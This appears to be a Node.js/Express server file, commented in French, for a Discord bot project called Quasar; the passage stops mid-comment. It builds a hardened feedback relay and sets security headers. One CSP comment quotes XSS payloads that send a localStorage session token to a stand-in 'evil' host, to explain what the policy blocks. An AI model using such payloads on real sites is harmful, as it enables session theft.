const express = require('express');
const cookieParser = require('cookie-parser');
const path = require('path');
const fs = require('fs');
const assetVersion = require('./services/assetVersion');
const vnctDs = require('./services/vnctDs');
const nouveautes = require('./services/nouveautes');
const { errorHandler } = require('./middleware/errorHandler');

const DASHBOARD_DIR = path.join(__dirname, '..', 'dashboard');
const PUBLIC_DIR = path.join(__dirname, '..', 'public');

// ═══════════════════════════════════════════════════════════════
//  Relais de signalement (bouton flottant du design system VNCT)
//
//  Le FAB du DS a deux chemins d'envoi, et donc deux contrats possibles :
//   1. Sema (chemin nominal) : multipart/form-data à plat (type, service,
//      description, screenshots…), relayé tel quel vers /api/public/report.
//      C'est ce qu'envoie le dashboard, qui embarque sa copie locale du DS.
//   2. Repli webhook Discord : quand Sema est injoignable, le DS distant
//      bascule sur VNCT.config.discordWebhookUrl — qui pointe ici pour la
//      vitrine — avec un corps Discord ({ embeds: [...] } en JSON, ou un
//      multipart payload_json + fileN s'il y a des captures).
//
//  Les deux arrivent sur la même route : on discrimine sur le Content-Type
//  (et, pour le multipart, sur la présence du champ payload_json propre à
//  Discord). Sans ça, un signalement de repli partirait vers Sema qui ne sait
//  pas le lire, et serait perdu.
// ═══════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════
//  Identification du client derrière les relais
//
//  Le limiteur de débit du relais de signalement ne vaut que par la clé qu'il
//  compte. Se tromper de clé ne le rend pas inefficace : il devient un
//  INTERRUPTEUR GLOBAL, qu'un seul flood referme sur toutes les visiteuses et
//  tous les visiteurs à la fois. Pire que pas de limiteur du tout.
//
//  Le nombre de relais devant Quasar dépend de l'installation, donc aucune
//  valeur codée en dur n'est juste :
//   - auto-hébergement direct (docker-compose officiel, port publié) : aucun
//     relais, `req.ip` est déjà la bonne adresse ;
//   - un reverse proxy local (Nginx, Caddy) : un saut ;
//   - l'instance Venacity : DEUX sauts, Cloudflare PUIS coolify-proxy (Traefik).
//     Avec `trust proxy` à 1, Express retire un seul maillon et rend l'adresse
//     de bordure Cloudflare — identique pour la Terre entière.
//
//  D'où TRUST_PROXY, à régler par la personne qui exploite l'instance. Défaut
//  fermé : `false`, l'hypothèse « aucun relais », cohérente avec le reste du
//  projet (DASHBOARD_HOST en loopback, refus sans BOT_OWNER_ID, etc.). Un
//  défaut ouvert laisserait n'importe qui forger son propre X-Forwarded-For.
// ═══════════════════════════════════════════════════════════════

function resoudreTrustProxy() {
    const brut = (process.env.TRUST_PROXY || '').trim();
    if (!brut) return false;
    if (brut === 'true') return true;
    if (brut === 'false') return false;
    const n = Number(brut);
    if (Number.isInteger(n) && n >= 0) return n;
    // Ni un nombre de sauts, ni un booléen : liste d'adresses ou de CIDR, que
    // proxy-addr sait consommer telle quelle.
    return brut;
}

let trustProxyAvertissementEmis = false;

/**
 * Pose le réglage sur l'application et avertit une seule fois si l'exploitante
 * ou l'exploitant ne l'a pas déclaré. L'avertissement compte : sans TRUST_PROXY,
 * rien ne casse visiblement — le limiteur compte simplement tout le monde
 * ensemble, et on ne s'en aperçoit que le jour où il refuse les signalements de
 * tout le monde. Un défaut silencieux mérite une ligne au démarrage.
 */
function appliquerTrustProxy(app) {
    const valeur = resoudreTrustProxy();
    app.set('trust proxy', valeur);

    if (valeur === false && !trustProxyAvertissementEmis) {
        trustProxyAvertissementEmis = true;
        console.warn('[Quasar] TRUST_PROXY non défini : Quasar suppose qu\'aucun relais n\'est devant lui.');
        console.warn('[Quasar] Derrière un reverse proxy ou Cloudflare, réglez-le (nombre de relais) : sans quoi le limiteur de débit du relais de signalement compte toutes les requêtes sous une seule adresse.');
    }
}

/**
 * Clé de comptage du limiteur de débit.
 *
 * `CF-Connecting-IP` porte l'adresse réelle du client et Cloudflare la réécrit
 * systématiquement, y compris quand le client en fournit une. Elle traverse
 * donc les deux sauts sans être écrasée, là où X-Forwarded-For est réécrit par
 * Traefik. Mais elle n'est digne de confiance QUE si un relais de confiance est
 * effectivement devant : sans relais déclaré, n'importe qui l'inventerait pour
 * repartir de zéro à chaque requête. D'où la condition sur TRUST_PROXY.
 */
function cleClient(req) {
    if (resoudreTrustProxy() !== false) {
        const cf = req.headers['cf-connecting-ip'];
        if (typeof cf === 'string' && cf.trim()) return cf.trim();
    }
    return req.ip || req.socket?.remoteAddress || 'inconnue';
}

function mountFeedbackRelay(app) {
    // Le domaine dev.vena.city utilisé jusqu'ici n'a jamais existé : tous les
    // signalements partaient dans le vide. Le backend réel est Sema.
    const SEMA_URL = process.env.REPORT_RELAY_URL || 'https://sema.vena.city';
    const WEBHOOK_URL = process.env.FEEDBACK_WEBHOOK_URL;

    // ─── Plafond du corps de requête ────────────────────────────────────────
    //
    // express.json() ne borne QUE l'application/json (100 ko par défaut). Tout
    // multipart/form-data lui échappe et atterrit dans relayRaw(), qui empilait
    // les chunks sans aucune limite : un seul POST de 2 Go suffisait à tuer le
    // processus par OOM. Or l'API et le bot Discord partagent ce processus — le
    // bot tombait donc avec elle, sur tous les serveurs à la fois. La route est
    // publique et non authentifiée dans les trois modes : ce plafond est le
    // seul rempart.
    //
    // 10 Mo : la limite de pièce jointe d'un webhook Discord sans abonnement.
    // Au-delà, Discord refuserait de toute façon le message.
    const MAX_BODY_BYTES = 10 * 1024 * 1024;

    // Le DS joint jusqu'à 10 captures ; cinq suffisent à décrire un bug et
    // bornent le travail du parseur autant que le poids du message.
    const MAX_FILES = 5;
    const MAX_FILE_BYTES = 8 * 1024 * 1024;
    // Borne dure sur le nombre de parties multipart : sans elle, un corps de
    // 10 Mo découpé en dizaines de milliers de parties minuscules ferait du
    // parseur une cible de déni de service à lui tout seul.
    const MAX_PARTS = 32;

    // ─── Limiteur de débit par IP ───────────────────────────────────────────
    //
    // Le relais publie dans un salon Discord sans authentification : sans
    // limite, une boucle curl y déverse ce qu'elle veut aussi vite que le
    // réseau le permet. Cinq signalements par tranche de dix minutes laissent
    // largement de quoi décrire un bug puis se corriger, et rendent le flood
    // inintéressant.
    //
    // En mémoire et sans dépendance : le compteur n'a pas besoin de survivre à
    // un redémarrage (qui remet aussi l'attaque à zéro), et Quasar tourne en un
    // seul processus.
    const RATE_WINDOW_MS = 10 * 60 * 1000;
    const RATE_MAX_HITS = 5;
    // Borne dure sur la table, même motif que DEDUPE_MAX_ENTRIES dans
    // services/incidents.js : une clé par IP vue, ça se remplit tout seul sous
    // une attaque distribuée. Sans plafond, le code qui protège le processus
    // devient lui-même la fuite mémoire qui le tue.
    const RATE_MAX_CLIENTS = 1000;

    /** @type {Map<string, { count: number, start: number }>} */
    const hits = new Map();

    function purgeHits(now) {
        if (hits.size <= RATE_MAX_CLIENTS) return;
        for (const [ip, entry] of hits) {
            if (now - entry.start >= RATE_WINDOW_MS) hits.delete(ip);
        }
        // Si rien n'a expiré (afflux d'IP distinctes), on évince les plus
        // anciennes entrées vues. Un compteur perdu vaut mieux qu'une table qui
        // grossit sans fin ; et une attaque assez distribuée pour en arriver là
        // échappait déjà à un limiteur par IP.
        for (const ip of hits.keys()) {
            if (hits.size <= RATE_MAX_CLIENTS) break;
            hits.delete(ip);
        }
    }

    /**
     * Fenêtre fixe : simple à lire, et le pire cas (deux fenêtres consécutives
     * consommées à cheval) reste borné au double du quota.
     * @returns {boolean} true si la requête doit être refusée.
     */
    function rateLimited(ip, now = Date.now()) {
        const entry = hits.get(ip);
        if (!entry || now - entry.start >= RATE_WINDOW_MS) {
            hits.set(ip, { count: 1, start: now });
            purgeHits(now);
            return false;
        }
        entry.count += 1;
        return entry.count > RATE_MAX_HITS;
    }

    // ─── Fabrication du message Discord ─────────────────────────────────────
    //
    // Rien de ce qui arrive de l'extérieur n'est recopié tel quel vers le
    // webhook : l'objet envoyé est reconstruit ici, champ par champ, à partir
    // d'une liste blanche. C'est la leçon de la faille corrigée : relayer le
    // corps brut revenait à donner à n'importe qui le droit d'écrire ce qu'il
    // voulait dans le salon Discord de Venacity, mentions comprises.

    // Limites de l'API Discord. On tronque au lieu de refuser : une description
    // trop longue reste un signalement légitime, et Discord rejetterait le
    // message entier pour un caractère de trop.
    const MAX_TITLE = 256;
    const MAX_DESCRIPTION = 4096;
    const MAX_FIELD_NAME = 256;
    const MAX_FIELD_VALUE = 1024;
    const MAX_FOOTER = 2048;
    const MAX_FIELDS = 25;

    function clamp(text, max) {
        const value = String(text ?? '');
        return value.length <= max ? value : `${value.slice(0, max - 1)}…`;
    }

    function isPlainObject(value) {
        return Boolean(value) && typeof value === 'object' && !Array.isArray(value);
    }

    /**
     * Reconstruit un embed sûr à partir de celui reçu. Toute clé absente de la
     * liste blanche est ABANDONNÉE — notamment `url` (un titre cliquable est un
     * vecteur d'hameçonnage) et `image` (une URL arbitraire ferait du salon un
     * afficheur d'images distantes, et du serveur leur client HTTP).
     * @returns {object|null} null si la forme reçue n'est pas exploitable.
     */
    function sanitizeEmbed(raw) {
        if (!isPlainObject(raw)) return null;
        const embed = {};

        if (raw.title !== undefined) {
            if (typeof raw.title !== 'string') return null;
            embed.title = clamp(raw.title, MAX_TITLE);
        }
        if (raw.description !== undefined) {
            if (typeof raw.description !== 'string') return null;
            embed.description = clamp(raw.description, MAX_DESCRIPTION);
        }
        if (raw.color !== undefined) {
            if (!Number.isInteger(raw.color) || raw.color < 0 || raw.color > 0xFFFFFF) return null;
            embed.color = raw.color;
        }
        if (raw.timestamp !== undefined) {
            // Renormalisé plutôt que recopié : la chaîne repartira vers Discord.
            if (typeof raw.timestamp !== 'string' || Number.isNaN(Date.parse(raw.timestamp))) return null;
            embed.timestamp = new Date(raw.timestamp).toISOString();
        }
        if (raw.footer !== undefined) {
            if (!isPlainObject(raw.footer) || typeof raw.footer.text !== 'string') return null;
            embed.footer = { text: clamp(raw.footer.text, MAX_FOOTER) };
        }
        if (raw.fields !== undefined) {
            if (!Array.isArray(raw.fields)) return null;
            const fields = [];
            for (const field of raw.fields.slice(0, MAX_FIELDS)) {
                if (!isPlainObject(field)) return null;
                if (typeof field.name !== 'string' || typeof field.value !== 'string') return null;
                // Discord refuse un champ vide : on écarte plutôt que de casser
                // l'envoi complet pour un champ optionnel resté vide côté client.
                if (!field.name.trim() || !field.value.trim()) continue;
                fields.push({
                    name: clamp(field.name, MAX_FIELD_NAME),
                    value: clamp(field.value, MAX_FIELD_VALUE),
                    inline: field.inline === true,
                });
            }
            embed.fields = fields;
        }

        // Un embed sans la moindre substance ne dit rien à personne : c'est le
        // signe d'un corps mal formé, pas d'un signalement.
        const empty = !embed.title && !embed.description && !(embed.fields || []).length;
        return empty ? null : embed;
    }

    /**
     * Enveloppe Discord acceptée en entrée : `{ embeds: [...] }`, et RIEN
     * d'autre. Le refus des clés inconnues est volontairement dur : `content`,
     * `username`, `avatar_url`, `allowed_mentions`, `components`, `poll`,
     * `thread_name` sont exactement ce qui permettait de faire sonner @everyone
     * et d'usurper l'identité du webhook. Les tolérer « au cas où » reviendrait
     * à rouvrir la faille au premier champ ajouté par Discord.
     * @returns {object|null} l'embed reconstruit, ou null.
     */
    function sanitizeIncomingPayload(raw) {
        if (!isPlainObject(raw)) return null;
        for (const key of Object.keys(raw)) {
            if (key !== 'embeds') return null;
        }
        if (!Array.isArray(raw.embeds) || raw.embeds.length === 0) return null;
        // Un seul embed part, comme avant : le DS n'en produit jamais deux.
        return sanitizeEmbed(raw.embeds[0]);
    }

    /**
     * Corps final envoyé au webhook. allowed_mentions vide sur TOUS les envois,
     * sans exception : c'est ce qui neutralise un « @everyone » écrit dans un
     * texte. Posé ici, à l'unique endroit qui fabrique un corps Discord, pour
     * qu'un chemin ajouté plus tard ne puisse pas l'oublier.
     */
    function discordBody(embed) {
        return { embeds: [embed], allowed_mentions: { parse: [] } };
    }

    // Contrat Discord en JSON. Le corps a déjà été consommé par express.json()
    // en amont : on repart de req.body, pas des chunks bruts.
    function relayToWebhook(req, res) {
        if (!WEBHOOK_URL) return res.status(503).json({ error: 'Feedback non configuré' });
        const embed = sanitizeIncomingPayload(req.body);
        if (!embed) return res.status(400).json({ error: 'Format invalide' });
        return forwardToWebhook(res, { 'Content-Type': 'application/json' },
            JSON.stringify(discordBody(embed)));
    }

    function forwardToWebhook(res, headers, body) {
        return fetch(WEBHOOK_URL, { method: 'POST', headers, body })
            .then(r => {
                if (r.ok) return res.json({ success: true });
                return r.text().then(t => res.status(r.status).json({ error: t }));
            })
            .catch(() => res.status(500).json({ error: 'Envoi échoué' }));
    }

    // ─── Lecture du multipart ───────────────────────────────────────────────
    //
    // Découpage minimal, sans dépendance : le corps est déjà en mémoire et
    // borné par MAX_BODY_BYTES, les sous-tableaux ne recopient rien. Il ne sert
    // QUE pour le chemin Discord, où il faut reconstruire le message. Le chemin
    // Sema, lui, continue de forwarder les octets d'origine tels quels : Sema
    // valide de son côté, et le moindre écart de parsing y casserait un contrat
    // qui tourne en production.
    const HEAD_SEP = Buffer.from('\r\n\r\n');

    function partHeaders(head) {
        const disposition = /content-disposition:[^\r\n]*/i.exec(head)?.[0] || '';
        return {
            name: /\bname="([^"]*)"/i.exec(disposition)?.[1],
            filename: /\bfilename="([^"]*)"/i.exec(disposition)?.[1],
            type: /content-type:\s*([^\r\n;]+)/i.exec(head)?.[1]?.trim().toLowerCase(),
        };
    }

    /** @returns {Array<{name?: string, filename?: string, type?: string, data: Buffer}>|null} */
    function parseMultipart(body, contentType) {
        const match = /boundary=(?:"([^"]+)"|([^;\s]+))/i.exec(contentType || '');
        if (!match) return null;
        const marker = Buffer.from(`--${match[1] || match[2]}`);

        const parts = [];
        let cursor = body.indexOf(marker);
        if (cursor === -1) return null;
        cursor += marker.length;

        while (parts.length <= MAX_PARTS) {
            // Épilogue : le délimiteur de fin est suivi de deux tirets.
            if (body[cursor] === 0x2D && body[cursor + 1] === 0x2D) return parts;
            const headEnd = body.indexOf(HEAD_SEP, cursor);
            if (headEnd === -1) return null;
            const next = body.indexOf(marker, headEnd + HEAD_SEP.length);
            // Le CRLF qui précède le délimiteur lui appartient, pas à la valeur.
            if (next === -1 || next - 2 < headEnd + HEAD_SEP.length) return null;
            parts.push({
                ...partHeaders(body.subarray(cursor, headEnd).toString('utf8')),
                data: body.subarray(headEnd + HEAD_SEP.length, next - 2),
            });
            cursor = next + marker.length;
        }
        return null;
    }

    /**
     * Repli Discord AVEC captures. Le payload_json de l'appelant n'est jamais
     * relayé : il est parsé, passé au même filtre que le chemin JSON, et un
     * nouveau corps est fabriqué ici. Les fichiers sont renommés côté serveur
     * (screenshot-N.png, champs fileN) — c'est déjà la convention du DS, et ça
     * supprime au passage toute injection par le nom de fichier.
     */
    function relayMultipartToWebhook(res, body, contentType) {
        const parts = parseMultipart(body, contentType);
        if (!parts) return res.status(400).json({ error: 'Format invalide' });

        const payloadPart = parts.find(p => p.name === 'payload_json' && p.filename === undefined);
        if (!payloadPart) return res.status(400).json({ error: 'Format invalide' });

        let parsed;
        try {
            parsed = JSON.parse(payloadPart.data.toString('utf8'));
        } catch {
            return res.status(400).json({ error: 'Format invalide' });
        }
        const embed = sanitizeIncomingPayload(parsed);
        if (!embed) return res.status(400).json({ error: 'Format invalide' });

        // Captures seules : ce relais ne sert qu'à ça, et un webhook Discord qui
        // accepterait n'importe quel type de fichier depuis l'extérieur devient
        // un hébergeur gratuit pour n'importe quoi.
        const files = parts
            .filter(p => p.filename !== undefined && (p.type || '').startsWith('image/'))
            .filter(p => p.data.length > 0 && p.data.length <= MAX_FILE_BYTES)
            .slice(0, MAX_FILES);

        // La grande image de l'embed n'est rétablie que si la pièce jointe
        // correspondante a réellement survécu au filtrage : une référence
        // attachment:// sans fichier casse l'affichage côté Discord.
        if (files.length > 0) embed.image = { url: 'attachment://screenshot-0.png' };

        // payload_json en première partie, les fichiers ensuite : c'est l'ordre
        // des exemples de l'API Discord, autant ne pas s'en écarter.
        const form = new FormData();
        form.append('payload_json', JSON.stringify(discordBody(embed)));
        files.forEach((file, i) => {
            form.append(`file${i + 1}`, new Blob([file.data], { type: file.type }), `screenshot-${i}.png`);
        });

        // Pas d'en-tête Content-Type : c'est fetch qui pose celui du FormData,
        // avec SA boundary. En forcer une ici produirait un corps illisible.
        return forwardToWebhook(res, undefined, form);
    }

    // Contrat Sema en multipart. Pas besoin de parser le body côté Quasar :
    // on bufferise les chunks bruts et on les forwarde avec le Content-Type
    // d'origine (la boundary du multipart en fait partie).
    function relayRaw(req, res) {
        const chunks = [];
        let received = 0;
        // Une seule réponse par requête : après le 413, le flux continue
        // d'arriver et `end` finirait par tirer une seconde fois.
        let refused = false;

        req.on('data', chunk => {
            if (refused) return;
            received += chunk.length;
            if (received > MAX_BODY_BYTES) {
                refused = true;
                chunks.length = 0;
                res.status(413).json({
                    error: 'Le signalement dépasse 10 Mo. Merci de joindre des captures plus légères.',
                });
                // La suite du flux est lue puis JETÉE, jamais accumulée : c'est
                // ce qui ferme l'OOM. On ne détruit PAS la socket pour autant —
                // un RST effacerait la réponse encore en vol côté client, qui ne
                // verrait qu'une connexion tombée au lieu du 413 que le
                // formulaire du DS affiche. Le reste de l'envoi coûte de la
                // bande passante, plus une once de mémoire, et le
                // `requestTimeout` de Node (5 min) borne le cas du flux lent.
                return;
            }
            chunks.push(chunk);
        });

        req.on('end', async () => {
            if (refused) return;
            const body = Buffer.concat(chunks);
            const contentType = req.headers['content-type'];

            // Repli Discord avec captures : multipart, mais contrat Discord.
            // Le champ payload_json est ajouté en premier par le DS, il tient
            // donc dans les premiers octets — inutile de scanner tout le corps.
            if (body.subarray(0, 1024).includes('name="payload_json"')) {
                if (!WEBHOOK_URL) return res.status(503).json({ error: 'Feedback non configuré' });
                return relayMultipartToWebhook(res, body, contentType);
            }

            try {
                const response = await fetch(`${SEMA_URL}/api/public/report`, {
                    method: 'POST',
                    headers: { 'content-type': contentType },
                    body,
                });
                const data = await response.json().catch(() => ({}));
                return res.status(response.ok ? 201 : response.status).json(data);
            } catch (err) {
                console.error('[Quasar] Relais de signalement en échec :', err.message);
                return res.status(502).json({ error: 'Impossible de contacter Sema' });
            }
        });

        req.on('error', () => {
            // Le destroy() du 413 provoque lui-même un `error` : ne pas répondre
            // deux fois.
            if (refused || res.headersSent) return;
            res.status(500).json({ error: 'Erreur de lecture' });
        });
    }

    app.post(['/api/feedback', '/api/feedback/vnct'], (req, res) => {
        if (rateLimited(cleClient(req))) {
            return res.status(429).json({
                error: 'Trop de signalements envoyés depuis cette adresse. Merci de réessayer dans quelques minutes.',
            });
        }
        const contentType = req.headers['content-type'] || '';
        if (contentType.includes('application/json')) return relayToWebhook(req, res);
        return relayRaw(req, res);
    });
}

// ═══════════════════════════════════════════════════════════════
//  Réponses authentifiées : jamais de cache
//
//  `/auth/me` et les routes d'API renvoient un contenu qui dépend du PORTEUR
//  du jeton, pas de l'URL. Sans directive explicite, un cache intermédiaire —
//  navigateur, proxy, CDN — est libre d'appliquer son heuristique et de
//  resservir la réponse d'une requête antérieure sur la même URL.
//
//  Ce n'est pas théorique : en production, le réglage de zone Cloudflare
//  « Browser Cache TTL » posait `max-age=14400` sur `/auth/me`, faute de
//  `Cache-Control` d'origine. Le navigateur qui avait visité la vitrine AVANT
//  de se connecter gardait le `{"authenticated":false}` obtenu à ce moment-là,
//  et le resservait à l'appel authentifié qui suit le retour d'OAuth — le
//  dashboard se croyait déconnecté juste après un login réussi, sans la
//  moindre trace côté serveur. Quatre heures durant, par navigateur.
//
//  `Vary` complète la directive : il déclare les en-têtes qui changent la
//  réponse. Sans lui, une requête porteuse d'un `Authorization` partage la
//  même entrée de cache qu'une requête anonyme.
//
//  Monté AVANT toutes les routes d'API et d'authentification, et non sur
//  chacune : une route ajoutée plus tard est couverte sans y penser. Même
//  raisonnement que pour le gestionnaire d'erreurs et les parseurs de corps.
// ═══════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════
//  En-têtes de sécurité et politique de sécurité du contenu
//
//  Le projet n'en posait aucun : ni CSP, ni X-Frame-Options, ni HSTS, ni
//  Referrer-Policy. Les seuls `setHeader` du dépôt étaient des `Cache-Control`.
//
//  Ce qui est fermé ici, et pourquoi c'est utile MALGRÉ `'unsafe-inline'` :
//
//   - `frame-ancestors 'none'` ferme le clickjacking. Sans lui, le dashboard
//     est encadrable : une administratrice connectée peut être amenée à valider
//     un effacement de données ou à désactiver l'antiraid en cliquant sur une
//     iframe transparente posée devant un bouton anodin.
//
//   - `connect-src` et `img-src` ferment l'EXFILTRATION. C'est le point clé :
//     le jeton de session vit dans localStorage et vaut sept jours sans
//     révocation possible, donc la valeur d'un XSS tient entièrement dans sa
//     capacité à faire sortir ce jeton. Le payload type
//     `fetch('//evil/'+localStorage.quasar_token)` échoue désormais, et sa
//     variante par `img.src` aussi.
//
//  Ce qui N'EST PAS fermé, et il faut le dire franchement : `script-src` porte
//  `'unsafe-inline'`, donc un XSS S'EXÉCUTE toujours. C'est imposé par le
//  dashboard, qui compte encore une centaine de gestionnaires d'événements en
//  ligne (`onclick="..."`) et plusieurs blocs `<script>` inline. Les retirer est
//  un chantier à part ; tant qu'il n'est pas fait, une CSP stricte rendrait le
//  dashboard inutilisable. L'exfiltration par NAVIGATION (`location = '//evil/'
//  + jeton`) reste elle aussi possible : aucune directive largement supportée
//  ne la couvre.
//
//  Les origines externes ne sont pas codées en dur : elles sont dérivées des
//  variables d'environnement qui les configurent, sinon toute personne qui
//  auto-héberge avec son propre design system verrait sa vitrine se briser.
// ═══════════════════════════════════════════════════════════════

/** Réduit une URL à son origine, ou rien si elle est absente ou invalide. */
function origine(url) {
    try {
        return url ? new URL(url).origin : null;
    } catch {
        return null;
    }
}

function construireCsp({ vitrine }) {
    const ds = origine(process.env.VNCT_DS_BASE_URL || 'https://design.vena.city');
    const sema = origine(process.env.REPORT_RELAY_URL || 'https://sema.vena.city');

    const directives = {
        'default-src': ["'self'"],
        'base-uri': ["'self'"],
        'object-src': ["'none'"],
        'frame-ancestors': ["'none'"],
        'form-action': ["'self'"],
        // 'unsafe-inline' : voir le commentaire ci-dessus. À retirer dès que les
        // gestionnaires en ligne du dashboard auront disparu.
        'script-src': ["'self'", "'unsafe-inline'"],
        'style-src': ["'self'", "'unsafe-inline'"],
        // data: couvre les favicons et les images encodées du design system.
        'img-src': ["'self'", 'data:'],
        'font-src': ["'self'", 'data:'],
        'connect-src': ["'self'"],
    };

    if (vitrine) {
        // La vitrine consomme le design system distant : feuille de style,
        // script, polices, et son sondage de version.
        if (ds) {
            directives['script-src'].push(ds);
            directives['style-src'].push(ds);
            directives['font-src'].push(ds);
            directives['img-src'].push(ds);
            directives['connect-src'].push(ds);
        }
    } else {
        // Le dashboard tourne sur sa copie locale du design system, mais affiche
        // les avatars et les icônes de serveur servis par Discord, et sa feuille
        // de style importe la police Inter depuis Google Fonts.
        directives['img-src'].push('https://cdn.discordapp.com');
        directives['style-src'].push('https://fonts.googleapis.com');
        directives['font-src'].push('https://fonts.gstatic.com');
    }

    // Le formulaire de signalement poste vers Sema. Sur la vitrine il l'appelle
    // en direct ; sur le dashboard il passe par le relais local, mais la valeur
    // est configurée sur les deux pages : l'autoriser des deux côtés évite un
    // blocage silencieux au premier signalement.
    if (sema) directives['connect-src'].push(sema);

    return Object.entries(directives)
        .map(([nom, valeurs]) => `${nom} ${valeurs.join(' ')}`)
        .join('; ');
}

function mountSecurityHeaders(app) {
    // Les deux politiques sont calculées une fois — les variables
    // d'environnement ne changent pas en vol — puis choisies PAR CHEMIN.
    //
    // Le découpage par application ne marchait pas : en mode `public`, une seule
    // application sert la vitrine ET le dashboard (`createApi` appelle
    // `mountDashboard` puis `mountVitrine`). `createSiteApi` n'existe qu'en mode
    // `site`. La vitrine recevait donc la politique du dashboard, qui n'autorise
    // pas le design system distant : la page sortait entièrement sans style.
    const cspDashboard = construireCsp({ vitrine: false });
    const cspVitrine = construireCsp({ vitrine: true });

    app.use((req, res, next) => {
        // `/dashboard` couvre la page de connexion, l'application et leurs
        // ressources locales. Tout le reste — vitrine, pages légales, et les
        // réponses d'API pour lesquelles la politique est sans effet — prend la
        // politique de la vitrine, la plus permissive des deux d'un seul cran.
        const estDashboard = req.path === '/dashboard' || req.path.startsWith('/dashboard/');
        const vitrine = !estDashboard;
        res.set('Content-Security-Policy', estDashboard ? cspDashboard : cspVitrine);
        // Doublon volontaire de frame-ancestors, pour les navigateurs anciens
        // qui ignorent la CSP mais respectent cet en-tête.
        res.set('X-Frame-Options', 'DENY');
        res.set('X-Content-Type-Options', 'nosniff');
        // Le dashboard chargeait des ressources tierces depuis des pages dont
        // l'URL a porté le jeton de session : rien ne doit fuiter par le Referer.
        res.set('Referrer-Policy', vitrine ? 'strict-origin-when-cross-origin' : 'no-referrer');

        // HSTS uniquement sur une requête déjà chiffrée. Une instance
        // auto-hébergée joignable en HTTP sur un réseau local ne doit pas se
        // retrouver verrouillée par un en-tête qu'elle ne peut plus honorer.
        if (req.secure) {
            res.set('Strict-Transport-Security', 'max-age=63072000; includeSubDomains');
        }
        next();
    });
}

function mountNoStore(app) {
    app.use(['/auth', '/api', '/callback'], (req, res, next) => {
        res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
        // res.vary() ajoute sans écraser : un Vary déjà posé en amont survit.
        res.vary('Authorization');
        res.vary('Cookie');
        next();
    });
}

// ═══════════════════════════════════════════════════════════════
//  Ouverture de l'instance publique — volontairement DÉCOUPLÉE du mode
//
//  PUBLIC_INSTANCE_OPEN ne décide QUE d'une chose : proposer ou non, aux
//  visiteurs de la vitrine, le bouton d'accès au dashboard. Elle ne conditionne
//  ni le démarrage du bot, ni le montage des routes, ni l'accessibilité réelle
//  de /dashboard — qui reste joignable en direct partout où le dashboard est
//  monté, bouton affiché ou non.
//
//  Pourquoi une variable dédiée : la v4.1.0 pilotait ce bouton avec QUASAR_MODE,
//  ce qui liait deux choses indépendantes. Une instance dont le bot tourne en
//  permanence a besoin du mode `public`, mais peut ne pas vouloir encore ouvrir
//  le dashboard aux visiteurs (mise en conformité en cours). Cette combinaison
//  — vitrine + bot qui tourne + bouton éteint — n'existait pas. Ne pas
//  recoupler les deux.
//
//  Défaut sûr : fermé. Seule la chaîne "true" (casse et espaces indifférents)
//  ouvre le bouton ; toute autre valeur ("1", "oui", vide, absente) le laisse
//  fermé. On ne devine jamais une intention d'ouverture.
// ═══════════════════════════════════════════════════════════════

function isPublicInstanceOpen() {
    return (process.env.PUBLIC_INSTANCE_OPEN || '').trim().toLowerCase() === 'true';
}

// ═══════════════════════════════════════════════════════════════
//  Lecture du corps des requêtes — commune aux deux applications
//
//  Express 5 laisse `req.body` à `undefined` quand aucun parseur ne reconnaît
//  le Content-Type, là où Express 4 posait un objet vide. Les routes, elles,
//  déstructurent directement (`const { name } = req.body`) : sans la ligne de
//  compatibilité ci-dessous, une requête sans corps ou mal typée ne produirait
//  plus une validation propre en 400, mais une exception.
//
//  Le rattrapage est fait ICI, une fois, plutôt que par une garde sur chacun
//  des accès : le jour où une route est ajoutée sans garde, elle est couverte
//  malgré tout. Même raisonnement que pour le gestionnaire d'erreurs — une
//  protection qui dépend de la mémoire de qui code finit par manquer.
// ═══════════════════════════════════════════════════════════════

function mountBodyParsers(app) {
    app.use(express.json());
    app.use((req, _res, next) => {
        if (req.body === undefined) req.body = {};
        next();
    });
}

/**
 * État du bouton d'accès au dashboard, tranché ici et injecté tel quel dans la
 * page (placeholder __DASHBOARD_CTA__). Deux conditions, toutes deux nécessaires :
 *  - le dashboard est réellement servi (mode `public`) : en mode `site` il
 *    n'existe pas, et un bouton menant à la page « bientôt de retour » serait un
 *    piège à clic ;
 *  - l'instance publique est déclarée ouverte (PUBLIC_INSTANCE_OPEN).
 * La page ne recalcule rien à partir du mode : elle reçoit 'on' ou 'off'.
 *
 * @param {'bot'|'site'|'public'} mode
 * @returns {'on'|'off'}
 */
function dashboardCtaState(mode) {
    return mode === 'public' && isPublicInstanceOpen() ? 'on' : 'off';
}

/**
 * Contexte de rendu d'une page de la vitrine (cf. services/vnctDs.js).
 *
 * `blocks` porte les fragments HTML calculés par requête. Ce sont des FONCTIONS
 * et non des chaînes : elles ne sont appelées que si la page rendue contient
 * réellement le placeholder correspondant — l'accueil ne paie pas le rendu du
 * changelog.
 */
function vitrineContext(mode) {
    return {
        mode,
        dashboardCta: dashboardCtaState(mode),
        blocks: { NOUVEAUTES_LIST: () => nouveautes.listHtml() },
    };
}

// ═══════════════════════════════════════════════════════════════
//  Vitrine publique (public/) — modes `site` et `public` uniquement
// ═══════════════════════════════════════════════════════════════

function mountVitrine(app, mode) {
    // Le polling de la version du DS ne démarre que si la vitrine est servie :
    // en mode `bot` (auto-hébergement), aucun appel sortant n'est ajouté.
    vnctDs.startVersionPolling();

    // API admin du journal des nouveautés. Montée ICI, avec la vitrine : c'est
    // la seule chose qu'elle alimente, et elle ne dépend ni du bot ni de la base
    // — elle fonctionne donc aussi en mode `site`. Sans QUASAR_ADMIN_API_KEY,
    // les routes répondent 503 : rien n'est publiable par défaut.
    app.use('/api', require('./routes/adminNouveautes'));

    app.get('/', (req, res) => vnctDs.send(res, path.join(PUBLIC_DIR, 'index.html'), vitrineContext(mode)));

    // Pages produit, servies sur des URLs SANS extension : ce sont les adresses
    // publiques (menu « … », liens sortants, partages) et elles doivent le
    // rester. Le garde-fou *.html ci-dessous continue de servir les mêmes
    // fichiers sur /<nom>.html, mais ces URLs-là ne sont exposées nulle part.
    const PRODUCT_PAGES = ['ethique', 'pourquoi', 'nouveautes', 'soutenir'];
    for (const name of PRODUCT_PAGES) {
        app.get(`/${name}`, (req, res) => {
            vnctDs.send(res, path.join(PUBLIC_DIR, `${name}.html`), vitrineContext(mode));
        });
    }

    // Garde-fou : toute requête GET/HEAD vers un *.html de public/ passe par le
    // rendu, quelle que soit la route. Empêche express.static de livrer un HTML
